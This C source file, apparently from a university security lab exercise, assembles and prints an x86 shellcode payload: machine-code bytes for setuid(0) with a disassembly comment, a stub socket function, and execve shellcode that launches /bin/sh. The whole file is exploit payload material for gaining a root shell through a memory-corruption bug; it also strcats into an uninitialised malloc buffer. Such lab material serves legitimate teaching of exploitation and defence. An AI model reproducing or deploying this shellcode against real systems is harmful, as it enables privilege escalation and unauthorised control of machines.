#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define	BLENGTH	128

char* 
connectSocket()
{

	return "";
}

char*
setuidRoot()
{
	//setuid(0);
/*

b8 d5 			movb    $0xd5,%eax
8b 5c 24 30		mov    0x30(%esp),%ebx
ff 15 d0 69 0f 08	call   *0x80f69d0

*/
	return  "\xb8\xd5"
		"\x8b\x5c\x24\x30"
		"\xff\x15\xd0\x69\x0f\x08";
}


/**
 From lab 6 solution to part C, by Darragh O'Brien
 launches a shell
*/
char*
launchShell()
{

	return 	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
		"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
		"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
		"\xff\x2f\x62\x69\x6e\x2f\x73\x68";
}

void
payload()
{
	char* hexPayload = (char*) malloc(BLENGTH);
	
	strcat(hexPayload, connectSocket());
	strcat(hexPayload, setuidRoot());
	strcat(hexPayload, launchShell());
	printf("%s\n", hexPayload);
}

int main()
{
	payload();
	return 0;
}
